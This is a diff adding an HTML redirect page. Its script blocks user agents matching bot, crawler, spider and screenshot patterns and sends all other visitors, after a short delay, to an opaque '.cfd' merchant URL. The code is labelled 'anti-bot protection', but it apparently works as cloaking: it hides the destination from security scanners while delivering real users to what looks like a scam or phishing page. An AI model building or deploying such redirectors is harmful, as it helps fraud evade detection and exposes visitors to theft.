@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; color: #333; }
+        .loader { text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <h2>Redirecting to the website...</h2>
+        <p>Please wait a moment.</p>
+    </div>
+
+    <script>
+        // Anti-bot protection: delay the redirect by 1.5 seconds
+        setTimeout(function() {
+            // Check if the visitor is a known bot or crawler
+            if (navigator.userAgent.match(/bot|crawl|spider|slurp|screenshot/i)) {
+                document.body.innerHTML = "<h2>Access denied for bots.</h2>";
+            } else {
+                // Replace the URL below with your actual target link
+                window.location.href = "https://merchant.364719058.cfd/4F3N0T6A8Q8";
+            }
+        }, 1500); // 1500 milliseconds = 1.5 seconds delay
+    </script>
+</body>
+</html>
